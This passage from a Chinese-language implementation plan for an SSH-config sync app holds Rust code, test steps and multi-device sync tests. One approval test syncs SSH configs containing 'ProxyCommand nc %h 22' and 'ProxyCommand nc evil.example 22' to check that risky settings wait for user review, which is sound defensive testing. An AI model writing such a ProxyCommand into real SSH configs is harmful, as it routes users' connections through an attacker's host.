            sp.records.insert(record_key(RecordKind::Host, &p.record.id), LocalRecord { record: p.record, seq: p.seq, dirty: false });
        }
        core.generation += 1;
        save_core(&mut core, &env.state_path)?;
    }
    env.events.applied(effects.len());
    env.events.wake();
    Ok(effects.len())
}

/// 拒絕(spec §7.4):丟棄這些待核准的記錄,本機維持原狀,不推送任何東西;只記下被拒絕的版本(`declined`)——
/// 之後本機修改這台主機時,新版本照 LWW 推送、蓋過它。
pub fn reject(env: &SyncEnv, space_id: &str, aliases: &[String]) -> Result<(), AppError> {
    mutate(env, |s| {
        let sp = s.spaces.get_mut(space_id).ok_or_else(|| AppError::Other("this space is not synced on this device".to_string()))?;
        if let Some(a) = aliases.iter().find(|a| !sp.pending_approvals.contains_key(*a)) {
            return Err(AppError::NotFound(format!("'{a}' is not waiting for approval")));
        }
        for alias in aliases {
            let p = sp.pending_approvals.remove(alias).expect("checked above");
            sp.declined.insert(alias.clone(), DeclinedVersion { version: p.record.version, updated_at_ms: p.record.updated_at_ms, seq: p.seq });
        }
        Ok(())
    })?;
    env.events.status();
    Ok(())
}
```

- [ ] **Step 11: 跑測試確認通過**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: PASS —— `test result: ok. 564 passed; 0 failed`(task 開始前 541)。數量有變的模組:`sync::account` 11(新)、`sync::hosts_file` 21 → 22、`sync::space_files` 9 → 11、`sync::spaces` 9(新)。非測試建置會有一長串 `dead_code` 類的 warning(`is never used` 之類):B2 留下的,加上本計畫新增、要到 B3b Task 2 才接上的項目;B3b Task 2 之後只剩既有的 `set_host_enabled`。這是預期的,不要加 `#[allow(dead_code)]`;不得有其他種類的 warning。

- [ ] **Step 12: Commit**

只加下列路徑(`src-tauri/Cargo.lock` 的版本漂移不要 stage):

```bash
git add src-tauri/src/sync/space_files.rs
git add src-tauri/src/sync/hosts_file.rs
git add src-tauri/src/sync/account.rs
git add src-tauri/src/sync/spaces.rs
git add src-tauri/src/sync/mod.rs
git commit -m "feat(sync): add v2 account lifecycle, space operations and approvals"
```

---

### Task 4: 一輪同步(spec §7.1)與依焦點調整的輪詢

> **已執行**(repo `389e8dc`;審查後的修正 `80caddf`)。下面保留原本的步驟作為紀錄,不要再執行;實際的程式碼以 repo 為準,審查後與本節不同的介面(`RoundOutcome` 的 `markers` / `backoff`、只屬於某條 chain 的上傳錯誤只停那個 space、被限流之後這一輪不再發請求)見 Global Constraints 的「Task 4 實際的介面」。執行後(兩個 keychain 測試都略過)是 `624 passed`(`sync::round` 38、`sync::relay` 26);下面 Step 裡的數字是原本計畫的。

把前三個 task 串成一輪:準備 space 檔 → 讀檔與不變式(以 space 為單位)→ 本機 diff → 一個批次請求取得帳戶與各 space
的新記錄(`deferred` 只把沒輪到的排在最前面立刻補抓;舊 relay 退回逐條查詢、space 每 3 輪;批次 `5xx` 第二次起這一輪
改逐條;`429` 退避)→ **先處理帳戶**(讀到 `rotation:*` 標記就記下 `frozen` 並停止,不套用任何東西)→ 提交帳戶並調整
space 檔 → 逐一提交 space(各自全有或全無、只更新自己的區段)→ 上傳(帳戶與各 space 分開;`409 frozen` 立刻停止)→
刪除排定的 chain → 事件。`relay::next_poll_delay` 依 B1 裁定加上焦點與最近操作;`round::next_delay` 從 `SyncRuntime`
讀出它們。`sync_once` 是背景執行緒每一輪的入口(B3b 接上;B3b Task 1 在它前面加 v1 升級,Task 3 加更換同步碼)。

**Files:**
- Create: `src-tauri/src/sync/round.rs`
- Modify: `src-tauri/src/sync/relay.rs`(`IDLE_POLL_INTERVAL`、`ACTIVE_WINDOW`、`next_poll_delay` 的新簽章與測試)
- Modify: `src-tauri/src/sync/testkit.rs`(`TestClock::advance`;`AppliedProbe` 從 `files` / `spaces` 的測試搬來共用)
- Modify: `src-tauri/src/sync/files.rs`(`apply_and_commit_space` 的不變式註解;測試改用 testkit 的 `AppliedProbe`)
- Modify: `src-tauri/src/sync/spaces.rs`(測試改用 testkit 的 `AppliedProbe`)
- Modify: `src-tauri/src/sync/mod.rs`

**Interfaces:**
- Consumes(Task 1–3):`files::{prepare_files, gather, apply_and_commit_space, reset_space_for_rematerialize, space_emptied,
  space_path, Applied, Gathered}`;`merge::{account_outgoing, apply_pushed_account, apply_pushed_space, device_name,
  merge_account, merge_space, plan_device, plan_hosts, push_outgoing, space_deleted_by, space_entry, space_key_slot, space_keys,
  space_outgoing, unpushed_host_effects}`;`runtime::{commit, is_superseded, save_core}`;`spaces::reconcile_space_files`;
  `account::check_relay`;`dto::{SyncConflict, ApprovalNotice}`;`state_v2::{FreezeInfo, AccountState, SyncStateV2}`。
  `push_outgoing` 依 Task 1 實際的介面(見 Global Constraints):先套用 `accepted`、再看 `frozen`、最後處理 `error`。
  `prepare_files`、`reconcile_space_files` 的失敗與 `approve` / `reject` 依 Task 2–3 實際的介面:`Conflict` 不再由這裡
  重發 `applied(0)`(`prepare_files` 自己發;`reconcile_space_files` 的由 `commit_account` 在放掉鎖之後發)、當成「馬上
  重跑」;`prepare_files` 換了 generation 之後的失敗照樣記進 `last_error`。
- Consumes(B2):`relay::{BatchPullItem, BatchPullResult, PullResponse, RelayApi, RelayError, FEATURE_PULL_BATCH,
  MAX_BATCH_PULL}`;`record::{record_key, RecordKind, SpaceKeyPayload}`。
- Produces(`relay`):`pub const IDLE_POLL_INTERVAL: Duration`(5 分鐘)、`pub const ACTIVE_WINDOW: Duration`(5 分鐘)、
  `pub fn next_poll_delay(chains: usize, focused: bool, last_activity_ms: u64, now_ms: u64, consecutive_failures: u32) -> Duration`
  (取代 B2 的 `next_poll_delay(chains, rate_limited_rounds)`;B2 之後沒有其他呼叫端)。
- Produces(`round`):常數 `ACCOUNT_GONE_MESSAGE`、`SPACE_GONE_MESSAGE`、`MISSING_KEY_MESSAGE`、`RATE_LIMITED_MESSAGE`、
  `RELAY_TROUBLE_MESSAGE`(唯讀帳戶沿用 `account::READ_ONLY_MESSAGE`);`pub struct RoundOutcome { pub frozen: bool }`;
  `pub fn next_delay(env: &SyncEnv) -> Duration`;`pub fn sync_once(env: &SyncEnv) -> Result<(), AppError>`(錯誤寫進
  `last_error` 並發 `status`;被搶先、主 config 在載入之後被外部改過(`Conflict`,馬上重跑)都不算錯誤);
  `pub fn run_round(env: &SyncEnv, generation: u64, s: SyncStateV2, keys: ChainKeys, mark_frozen_chains: bool) -> Result<RoundOutcome, AppError>`
  (`mark_frozen_chains = false` 給 B3b 更換同步碼的第 2 步:撞到凍結只回報、不記進狀態)。
- Produces(測試輔助,`round::tests` 是 `pub(crate)`,B3b 的測試會用):`settle(d: &TestDevice)`(跑到沒有事可做)、
  `pair() -> (Arc<FakeRelay>, Arc<TestClock>, TestDevice, TestDevice, String, String)`(兩台裝置、同一個帳戶、兩個 space)、
  `rotate_elsewhere(d: &TestDevice, relay: &FakeRelay)`(模擬另一台寫入更換標記並凍結);`TestClock::advance(&self, ms: u64)`;
  `testkit::AppliedProbe<'a>`(`new(&TestDevice)`、`all_free`、`wakes()`:記下 `applied` 發出時三把鎖是否都空著)。

- [ ] **Step 1: `src-tauri/src/sync/relay.rs` 的測試**

B2 的退避測試換成依焦點與最近操作的新測試。

`src-tauri/src/sync/relay.rs`:把

```rust

    #[test]
    fn rate_limits_back_off_up_to_fifteen_minutes() {
        let secs = |rounds| next_poll_delay(1, rounds).as_secs();
        assert_eq!(secs(0), 45);
        assert_eq!(secs(1), 90);
        assert_eq!(secs(2), 180);
        assert_eq!(secs(3), 360);
        assert_eq!(secs(4), 720);
        assert_eq!(secs(5), 900);
        assert_eq!(secs(u32::MAX), 900);
        // 退避不會比一般間隔短。
        assert_eq!(next_poll_delay(65, 1).as_secs(), 130);
    }

```

換成:

```rust

    #[test]
    fn the_poll_delay_follows_activity_and_backs_off_after_failures() {
        const NOW: u64 = 10_000_000;
        let active = |failures| next_poll_delay(1, true, 0, NOW, failures).as_secs();
        assert_eq!(active(0), 45);
        assert_eq!(active(1), 90);
        assert_eq!(active(2), 180);
        assert_eq!(active(3), 360);
        assert_eq!(active(4), 720);
        assert_eq!(active(5), 900);
        assert_eq!(active(u32::MAX), 900);
        // 視窗不在前景,但幾分鐘內有操作:照樣是一般間隔。
        assert_eq!(next_poll_delay(1, false, NOW - 60_000, NOW, 0).as_secs(), 45);
        // 閒置:約每 5 分鐘一次;退避不會比閒置間隔短。
        assert_eq!(next_poll_delay(1, false, NOW - 10 * 60_000, NOW, 0).as_secs(), 300);
        assert_eq!(next_poll_delay(1, false, 0, NOW, 1).as_secs(), 300);
        assert_eq!(next_poll_delay(1, false, 0, NOW, 3).as_secs(), 360);
        // chain 多的時候,一般間隔本身就比第一次退避長。
        assert_eq!(next_poll_delay(65, true, 0, NOW, 1).as_secs(), 130);
        // 時鐘倒退(最後操作在「未來」):當成正在用。
        assert_eq!(next_poll_delay(1, false, NOW + 5_000, NOW, 0).as_secs(), 45);
    }

```

- [ ] **Step 2: 測試設施 `src-tauri/src/sync/testkit.rs`**

測試設施:時鐘可以一次前進一段時間(輪詢間隔的測試要用)。

`AppliedProbe` 原本在 `files.rs` 與 `spaces.rs` 的測試裡各有一份(Task 2–3 的審查修正),round 的測試也要用:搬進 testkit,下面兩個檔案的測試改用它。

`src-tauri/src/sync/testkit.rs`:把

```rust
use crate::sync::record::{RecordKind, SpacePayload};
use crate::sync::relay::RelayApi;
use crate::sync::runtime::SyncRuntime;
use crate::sync::space_files::{slugify, space_file_name};
use crate::sync::state_v2::{AccountState, SpaceState, SyncNotice, SyncStateV2};
```

換成:

```rust
use crate::sync::record::{RecordKind, SpacePayload};
use crate::sync::relay::RelayApi;
use crate::sync::runtime::{SyncCore, SyncRuntime};
use crate::sync::space_files::{slugify, space_file_name};
use crate::sync::state_v2::{AccountState, SpaceState, SyncNotice, SyncStateV2};
```

`src-tauri/src/sync/testkit.rs`:把

```rust
    }

}

```

換成:

```rust
    }

    pub fn advance(&self, ms: u64) {
        self.0.fetch_add(ms, Ordering::SeqCst);
    }
}

```

`src-tauri/src/sync/testkit.rs`:把

```rust
        self.notices.lock().unwrap().push(notice.clone());
    }
    fn wake(&self) {
        self.wakes.fetch_add(1, Ordering::SeqCst);
```

換成:

```rust
        self.notices.lock().unwrap().push(notice.clone());
    }
    fn wake(&self) {
        self.wakes.fetch_add(1, Ordering::SeqCst);
    }
}

/// 記下 `applied` 被呼叫的當下 doc / backed_up / core 三把鎖是不是都空著 —— 引擎的通知一律在放掉所有鎖之後(`wake`
/// 除外)—— 與 `wake` 被呼叫了幾次。用法:`let probe = AppliedProbe::new(&d); let mut env = d.env(); env.events = &probe;`
pub struct AppliedProbe<'a> {
    doc: &'a Mutex<Option<SshConfigDoc>>,
    backed_up: &'a Mutex<HashSet<PathBuf>>,
    core: &'a Mutex<SyncCore>,
    pub all_free: Mutex<Vec<bool>>,
    wakes: AtomicUsize,
}

impl<'a> AppliedProbe<'a> {
    pub fn new(d: &'a TestDevice) -> Self {
        Self { doc: &d.doc, backed_up: &d.backed_up, core: &d.runtime.core, all_free: Mutex::new(Vec::new()), wakes: AtomicUsize::new(0) }
    }

    pub fn wakes(&self) -> usize {
        self.wakes.load(Ordering::SeqCst)
    }
}

impl SyncEvents for AppliedProbe<'_> {
    fn status(&self) {}
    fn applied(&self, _hosts: usize) {
        let free = self.doc.try_lock().is_ok() && self.backed_up.try_lock().is_ok() && self.core.try_lock().is_ok();
        self.all_free.lock().unwrap().push(free);
    }
    fn conflict(&self, _conflicts: &[SyncConflict]) {}
    fn approval(&self, _waiting: &[ApprovalNotice]) {}
    fn notice(&self, _notice: &SyncNotice) {}
    fn wake(&self) {
        self.wakes.fetch_add(1, Ordering::SeqCst);
```

- [ ] **Step 3: `src-tauri/src/sync/files.rs` 的測試**

`src-tauri/src/sync/files.rs`:把

```rust
    use crate::config::parser::parse_file;
    use crate::sync::fake_relay::FakeRelay;
    use std::sync::Mutex;
    use crate::sync::dto::{ApprovalNotice, SyncConflict};
    use crate::sync::env::SyncEvents;
    use crate::sync::record::{record_key, LocalRecord, Record};
    use crate::sync::runtime::SyncCore;
    use crate::sync::state_v2::SyncNotice;
    use crate::sync::testkit::{TestClock, TestDevice};

    fn host(alias: &str, deleted: bool, dirty: bool) -> (String, LocalRecord) {
```

換成:

```rust
    use crate::config::parser::parse_file;
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::record::{record_key, LocalRecord, Record};
    use crate::sync::testkit::{AppliedProbe, TestClock, TestDevice};

    fn host(alias: &str, deleted: bool, dirty: bool) -> (String, LocalRecord) {
```

`src-tauri/src/sync/files.rs`:刪除從下面這段開始

```rust
    /// 記下 `applied` 被呼叫的當下 doc / backed_up / core 三把鎖是不是都空著 —— 引擎的通知一律在放掉所有鎖之後(`wake` 除外)。
```

到下面這段為止的整段程式碼(含這兩段本身,共 26 行):

```rust
        fn wake(&self) {}
    }

```

- [ ] **Step 4: `src-tauri/src/sync/spaces.rs` 的測試**

`src-tauri/src/sync/spaces.rs`:把

```rust
    use super::*;
    use crate::sync::account::{create_account, FROZEN_MESSAGE, ROTATING_MESSAGE};
    use crate::sync::dto::{ApprovalNotice, SyncConflict};
    use crate::sync::env::{Clock, SyncEvents};
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::merge::{devices, merge_space};
```

換成:

```rust
    use super::*;
    use crate::sync::account::{create_account, FROZEN_MESSAGE, ROTATING_MESSAGE};
    use crate::sync::env::Clock;
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::merge::{devices, merge_space};
```

`src-tauri/src/sync/spaces.rs`:把

```rust
    use crate::sync::record::{Envelope, Record, SpacePayload, SCHEMA_VERSION};
    use crate::sync::relay::{PullResponse, RelayApi};
    use crate::sync::runtime::SyncCore;
    use crate::sync::state_v2::{FreezeInfo, RotationProgress};
    use crate::sync::testkit::{TestClock, TestDevice};
    use std::sync::Mutex;

    fn new_device(name: &str) -> (TestDevice, String) {
```

換成:

```rust
    use crate::sync::record::{Envelope, Record, SpacePayload, SCHEMA_VERSION};
    use crate::sync::relay::{PullResponse, RelayApi};
    use crate::sync::state_v2::{FreezeInfo, RotationProgress};
    use crate::sync::testkit::{AppliedProbe, TestClock, TestDevice};

    fn new_device(name: &str) -> (TestDevice, String) {
```

`src-tauri/src/sync/spaces.rs`:刪除從下面這段開始

```rust
    /// 記下 `applied` 被呼叫的當下 doc / backed_up / core 三把鎖是不是都空著 —— 引擎的通知一律在放掉所有鎖之後(`wake` 除外)
```

到下面這段為止的整段程式碼(含這兩段本身,共 40 行):

```rust
            self.wakes.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        }
    }

```

- [ ] **Step 5: 寫失敗的測試:`src-tauri/src/sync/round.rs`**

多台裝置的情境測試(兩台、同一個 `FakeRelay` 與 `TestClock`),外加 `pull_all` 的單元測試;`tests` 模組是 `pub(crate)`,`settle`、`pair`、`rotate_elsewhere` 之後的 task 會用。`a_rename_never_overwrites_a_file_on_another_device` 也釘住「改名被擋的提示關掉之後不再冒出來」。

`a_push_that_stops_part_way_keeps_what_the_relay_accepted` 釘住上傳停在第二批時,第一批被接受的記錄已經乾淨(`FakeRelay::set_push_quota`)。

`an_include_list_that_cannot_be_written_reruns_the_round_instead_of_reporting_an_error`、`a_rename_from_another_device_waits_for_a_main_config_edited_elsewhere` 釘住 Task 2–3 的 `Conflict` 契約(`applied(0)` 只發一次、在鎖都放掉之後;不是錯誤、馬上重跑);`a_prepare_failure_after_the_state_changed_is_recorded_in_the_same_round` 釘住 Task 2 審查的 M8;`a_version_that_arrives_after_the_review_is_never_approved_unseen` 在一輪一輪的同步裡驗證 `(alias, seq)` 的核准。核准與拒絕以 `shown` 取得對話框顯示的 `(alias, seq)`。

建立 `src-tauri/src/sync/round.rs`,先只放 module 註解、`use` 與測試(實作在後面的步驟加入):

```rust
//! 一輪同步(spec §7.1):準備 space 檔 → 讀檔與不變式(以 space 為單位)→ 本機 diff → 一個批次請求取得帳戶與各
//! space 的新記錄(deferred 補抓、舊 relay 退回逐條查詢)→ **先處理帳戶**(有更換標記就記下 `frozen` 並停止)→ 提交
//! 帳戶並調整 space 檔 → 逐一提交 space(各自全有或全無、只更新自己的區段)→ 上傳(帳戶與各 space 分開;`409 frozen`
//! 立刻停止)→ 刪除排定的 chain → 事件。網路一律不持有 doc/core 鎖;每個提交都在 core 鎖內比 generation。

use std::collections::BTreeMap;
use std::path::PathBuf;
use std::sync::atomic::Ordering;
use std::time::Duration;

use crate::error::AppError;
use crate::sync::account::{check_relay, READ_ONLY_MESSAGE};
use crate::sync::crypto::ChainKeys;
use crate::sync::dto::{ApprovalNotice, SyncConflict};
use crate::sync::env::SyncEnv;
use crate::sync::files::{
    apply_and_commit_space, gather, prepare_files, reset_space_for_rematerialize, space_emptied, space_path, Applied, Gathered,
};
use crate::sync::merge::{
    account_outgoing, apply_pushed_account, apply_pushed_space, device_name, merge_account, merge_space, plan_device,
    plan_hosts, push_outgoing, space_deleted_by, space_entry, space_key_slot, space_keys, space_outgoing,
    unpushed_host_effects,
};
use crate::sync::record::{record_key, RecordKind, SpaceKeyPayload};
use crate::sync::relay::{
    next_poll_delay, BatchPullItem, BatchPullResult, PullResponse, RelayApi, RelayError, FEATURE_PULL_BATCH, MAX_BATCH_PULL,
};
use crate::sync::runtime::{commit, is_superseded, save_core, SyncCore};
use crate::sync::spaces::reconcile_space_files;
use crate::sync::state_v2::{AccountState, FreezeInfo, SyncStateV2};

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::sync::account::{create_account, join_account};
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::merge::{put_account_record, space_entries};
    use crate::sync::record::{rotation_meta_id, RotationMarkerPayload};
    use crate::sync::spaces::{approve, create_space, delete_space, reject, rename_space, select_space, Reviewed};
    use crate::sync::state_v2::SyncNotice;
    use crate::sync::env::Clock;
    use crate::sync::testkit::{AppliedProbe, TestClock, TestDevice};
    use std::sync::Arc;

    /// 跑到不再要求立刻重跑為止(最多 10 輪)。
    pub(crate) fn settle(d: &TestDevice) {
        for _ in 0..10 {
            let before = d.events.wakes();
            let _ = sync_once(&d.env());
            if d.events.wakes() == before {
                return;
            }
        }
        panic!("sync never settled");
    }

    /// A 建立帳戶(Personal),B 加入並勾選 Personal;兩台都同步完。
    pub(crate) fn pair() -> (Arc<FakeRelay>, Arc<TestClock>, TestDevice, TestDevice, String, String) {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        let b = TestDevice::new("b", &relay, &clock);
        let words = create_account(&a.env(), "MacBook-A").unwrap();
        settle(&a);
        join_account(&b.env(), &words, "MacBook-B").unwrap();
        let personal = a.state().spaces.keys().next().unwrap().clone();
        select_space(&b.env(), &personal).unwrap();
        settle(&b);
        settle(&a);
        (relay, clock, a, b, words, personal)
    }

    /// 核准對話框顯示的內容:這個 space 每台等待核准的主機與它的版本序號(`approve` / `reject` 只認使用者看過的那一版)。
    fn shown(d: &TestDevice, space_id: &str) -> Vec<(String, u64)> {
        d.state().spaces[space_id].pending_approvals.iter().map(|(alias, p)| (alias.clone(), p.seq)).collect()
    }

    #[test]
    fn a_host_saved_on_one_device_arrives_on_the_other() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        a.save_in_app(&a.space_path(&personal), "Host web\n  HostName 10.0.0.1\n");
        settle(&a);
        settle(&b);
        assert_eq!(b.read(&b.space_path(&personal)), "Host web\n  HostName 10.0.0.1\n");
        assert!(b.state().spaces[&personal].records.values().all(|l| !l.dirty));
        // 外部編輯(另一個編輯器)也一樣,反方向。
        b.write_externally(&b.space_path(&personal), "Host web\n  HostName 10.0.0.2\n");
        settle(&b);
        settle(&a);
        assert_eq!(a.read(&a.space_path(&personal)), "Host web\n  HostName 10.0.0.2\n");
        assert!(a.events.applied.lock().unwrap().contains(&1));
    }

    #[test]
    fn spaces_created_renamed_and_deleted_on_one_device_follow_on_the_others() {
        let (relay, _clock, a, b, _words, _personal) = pair();
        let work = create_space(&a.env(), "Work").unwrap();
        a.save_in_app(&a.space_path(&work), "Host db\n");
        settle(&a);
        settle(&b);
        let entries = space_entries(b.state().account.as_ref().unwrap());
        assert!(entries.iter().any(|e| e.id == work && e.name == "Work"), "B sees the new space");
        assert!(!b.state().spaces.contains_key(&work), "but does not sync it until it is selected");
        select_space(&b.env(), &work).unwrap();
        settle(&b);
        assert_eq!(b.read(&b.space_path(&work)), "Host db\n");
        // A 改名:B 的檔案跟著改名、Include 跟著換。
        rename_space(&a.env(), &work, "Office").unwrap();
        settle(&a);
        settle(&b);
        let renamed = b.space_path(&work);
        assert_eq!(renamed.file_name().unwrap().to_string_lossy(), format!("office-{}.config", &work[..8]));
        assert_eq!(b.read(&renamed), "Host db\n");
        assert!(b.main_config().contains(&format!("office-{}.config", &work[..8])));
        assert!(!b.main_config().contains(&format!("work-{}.config", &work[..8])));
        // A 刪除:tombstone 上傳之後才刪 chain(上傳被限流的那一輪不刪);B 移除檔案與狀態,留下提示。
        delete_space(&a.env(), &work).unwrap();
        relay.fail_pushes_with_429(1);
        let _ = sync_once(&a.env());
        assert!(relay.exists(&work), "the tombstones are not on the relay yet");
        settle(&a);
        assert!(!relay.exists(&work), "the chain is deleted once the tombstones are on the relay");
        assert!(a.state().account.as_ref().unwrap().chain_deletes.is_empty());
        settle(&b);
        assert!(!renamed.exists());
        assert!(!b.state().spaces.contains_key(&work));
        assert!(b.state().notices.contains(&SyncNotice::SpaceDeleted { name: "Office".into(), by_device: "MacBook-A".into() }));
        assert!(b.events.notices.lock().unwrap().iter().any(|n| matches!(n, SyncNotice::SpaceDeleted { .. })));
    }

    #[test]
    fn a_delete_racing_a_rename_wins_everywhere() {
        let (relay, _clock, a, b, _words, _personal) = pair();
        let work = create_space(&a.env(), "Work").unwrap();
        settle(&a);
        settle(&b);
        select_space(&b.env(), &work).unwrap();
        settle(&b);
        // A 刪除(還沒上傳)的同時,B 改名並先上傳:B 的改名贏了 `space` 記錄,A 的 `spacekey` tombstone 卻照樣上去 ——
        // 沒有金鑰的 space 每台都當成已刪除,chain 也刪掉。
        delete_space(&a.env(), &work).unwrap();
        rename_space(&b.env(), &work, "Office").unwrap();
        settle(&b);
        settle(&a);
        assert!(!relay.exists(&work), "the delete wins: the spacekey tombstone outlives the rename");
        assert!(a.state().account.as_ref().unwrap().chain_deletes.is_empty());
        settle(&b);
        assert!(!b.state().spaces.contains_key(&work));
        assert!(b.state().notices.contains(&SyncNotice::SpaceDeleted { name: "Office".into(), by_device: "MacBook-A".into() }));
        assert!(select_space(&b.env(), &work).is_err(), "a deleted space cannot be selected again");
    }

    #[test]
    fn a_rename_never_overwrites_a_file_on_another_device() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        let blocker = b.ssh_dir().join("sshelter").join(format!("lab-{}.config", &personal[..8]));
        std::fs::write(&blocker, "Host mine\n").unwrap();
        rename_space(&a.env(), &personal, "Lab").unwrap();
        settle(&a);
        settle(&b);
        assert_eq!(b.read(&blocker), "Host mine\n");
        assert!(b.space_path(&personal).ends_with(format!("personal-{}.config", &personal[..8])));
        let blocked = |name: &str| {
            b.state().notices.iter().filter(|n| matches!(n, SyncNotice::RenameBlocked { name: shown, .. } if shown == name)).count()
        };
        assert_eq!(blocked("Lab"), 1);
        // 使用者關掉提示之後,同一個目標仍被擋:每一輪都重試改名,但不再加回提示、也不再發 `sync://notice`。
        b.runtime.core.lock().unwrap().state.as_mut().unwrap().notices.clear();
        let emitted = b.events.notices.lock().unwrap().len();
        a.save_in_app(&a.space_path(&personal), "Host web\n");
        settle(&a);
        settle(&b);
        settle(&b);
        assert_eq!(blocked("Lab"), 0);
        assert_eq!(b.events.notices.lock().unwrap().len(), emitted);
        // 目標換了(又改名,新的檔名也被擋)→ 再提示一次。
        let garage = b.ssh_dir().join("sshelter").join(format!("garage-{}.config", &personal[..8]));
        std::fs::write(&garage, "Host theirs\n").unwrap();
        rename_space(&a.env(), &personal, "Garage").unwrap();
        settle(&a);
        settle(&b);
        assert_eq!(blocked("Garage"), 1);
        assert_eq!(b.events.notices.lock().unwrap().len(), emitted + 1);
        // 擋路的檔案移走之後,下一輪就改名,記號清掉;另一個擋路的檔案從頭到尾沒被動過。
        std::fs::remove_file(&garage).unwrap();
        settle(&b);
        assert!(b.space_path(&personal).ends_with(format!("garage-{}.config", &personal[..8])));
        assert!(b.state().spaces[&personal].rename_blocked.is_none());
        assert_eq!(b.read(&blocker), "Host mine\n");
    }

    #[test]
    fn each_space_commits_on_its_own_and_a_broken_space_pauses_alone() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        let work = create_space(&a.env(), "Work").unwrap();
        settle(&a);
        settle(&b);
        select_space(&b.env(), &work).unwrap();
        settle(&b);
        // B 的 Personal 被手改成含 Include:只有它暫停。
        b.write_externally(&b.space_path(&personal), "Host x\n  Include ~/.ssh/extra.config\n");
        a.save_in_app(&a.space_path(&work), "Host db\n");
        a.save_in_app(&a.space_path(&personal), "Host web\n");
        settle(&a);
        let personal_cursor = b.state().spaces[&personal].cursor_seq;
        settle(&b);
        let s = b.state();
        assert!(s.spaces[&personal].last_error.as_deref().unwrap().contains("Include"));
        assert_eq!(s.spaces[&personal].cursor_seq, personal_cursor, "the paused space does not move");
        assert!(s.spaces[&work].last_error.is_none());
        assert_eq!(b.read(&b.space_path(&work)), "Host db\n", "the other space syncs as usual");
        // 修好之後照常同步。
        b.write_externally(&b.space_path(&personal), "Host x\n");
        settle(&b);
        settle(&a);
        assert!(b.state().spaces[&personal].last_error.is_none());
        assert!(a.read(&a.space_path(&personal)).contains("Host x\n"));
    }

    #[test]
    fn risky_settings_from_another_device_wait_for_approval() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        b.save_in_app(&b.space_path(&personal), "Host web\n  HostName 10.0.0.1\n");
        settle(&b);
        settle(&a);
        a.save_in_app(&a.space_path(&personal), "Host web\n  HostName 10.0.0.1\n  ProxyCommand nc %h 22\n");
        settle(&a);
        settle(&b);
        assert_eq!(b.read(&b.space_path(&personal)), "Host web\n  HostName 10.0.0.1\n", "held, not applied");
        let approvals = b.events.approvals.lock().unwrap().clone();
        assert_eq!(approvals, vec![ApprovalNotice { space_id: personal.clone(), space_name: "Personal".into(), aliases: vec!["web".into()] }]);
        assert_eq!(b.state().spaces[&personal].pending_approvals["web"].from_device, "MacBook-A");
        // 下一輪也不會把舊版當成本機修改推回去。
        settle(&b);
        settle(&a);
        assert!(a.read(&a.space_path(&personal)).contains("ProxyCommand"));
        assert_eq!(approve(&b.env(), &personal, &shown(&b, &personal)).unwrap(), Reviewed { applied: 1, changed: Vec::new() });
        assert!(b.read(&b.space_path(&personal)).contains("ProxyCommand nc %h 22"));
        // 拒絕:B 維持原狀;之後 B 在本機修改,照 LWW 推送、蓋過 A 的版本。
        a.save_in_app(&a.space_path(&personal), "Host web\n  HostName 10.0.0.1\n  ProxyCommand nc evil.example 22\n");
        settle(&a);
        settle(&b);
        assert_eq!(reject(&b.env(), &personal, &shown(&b, &personal)).unwrap(), Reviewed { applied: 1, changed: Vec::new() });
        settle(&b);
        assert!(b.read(&b.space_path(&personal)).contains("nc %h 22"));
        b.save_in_app(&b.space_path(&personal), "Host web\n  HostName 10.0.0.9\n");
        settle(&b);
        settle(&a);
        assert_eq!(a.read(&a.space_path(&personal)), "Host web\n  HostName 10.0.0.9\n");
        assert!(b.state().spaces[&personal].records.values().all(|l| !l.dirty), "the push was not stuck on a conflict");
    }

    #[test]
    fn a_baseline_round_reviews_every_risky_host_at_once() {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let a = TestDevice::new("a", &relay, &clock);
        let words = create_account(&a.env(), "MacBook-A").unwrap();
        let personal = a.state().spaces.keys().next().unwrap().clone();
        a.save_in_app(&a.space_path(&personal), "Host web\n  ForwardAgent yes\nHost db\n  ProxyCommand nc %h 22\nHost plain\n");
        settle(&a);
        let b = TestDevice::new("b", &relay, &clock);
        join_account(&b.env(), &words, "MacBook-B").unwrap();
        select_space(&b.env(), &personal).unwrap();
        settle(&b);
        assert_eq!(b.read(&b.space_path(&personal)), "Host plain\n");
        let approvals = b.events.approvals.lock().unwrap().clone();
        assert_eq!(approvals.len(), 1, "one review for the whole baseline");
        assert_eq!(approvals[0].aliases, vec!["db".to_string(), "web".to_string()]);
        assert_eq!(approve(&b.env(), &personal, &shown(&b, &personal)).unwrap().applied, 2);
        let text = b.read(&b.space_path(&personal));
        assert!(text.contains("ForwardAgent yes") && text.contains("ProxyCommand"));
    }

    #[test]
    fn a_version_that_arrives_after_the_review_is_never_approved_unseen() {
        let (_relay, _clock, a, b, _words, personal) = pair();
        a.save_in_app(&a.space_path(&personal), "Host web\n  ProxyCommand nc first 22\n");
        settle(&a);
        settle(&b);
        let reviewed = shown(&b, &personal); // 對話框顯示的是第一版
        assert_eq!(reviewed.len(), 1);
        // 對話框還開著,A 又改了一次:B 的下一輪把待核准的換成較新的版本。
        a.save_in_app(&a.space_path(&personal), "Host web\n  ProxyCommand nc second 22\n");
        settle(&a);
        settle(&b);
        assert!(b.state().spaces[&personal].pending_approvals["web"].text.contains("second"));
        let out = approve(&b.env(), &personal, &reviewed).unwrap();
        assert_eq!(out, Reviewed { applied: 0, changed: vec!["web".to_string()] }, "the user never saw the second version");
        assert!(!b.read(&b.space_path(&personal)).contains("ProxyCommand"), "neither version was applied");
        // 重新顯示之後核准的是第二版。
        assert_eq!(approve(&b.env(), &personal, &shown(&b, &personal)).unwrap().applied, 1);
        assert!(b.read(&b.space_path(&personal)).contains("nc second 22"));
    }

    #[test]
    fn an_include_list_that_cannot_be_written_reruns_the_round_instead_of_reporting_an_error() {
        let (_relay, _clock, a, _b, _words, _personal) = pair();
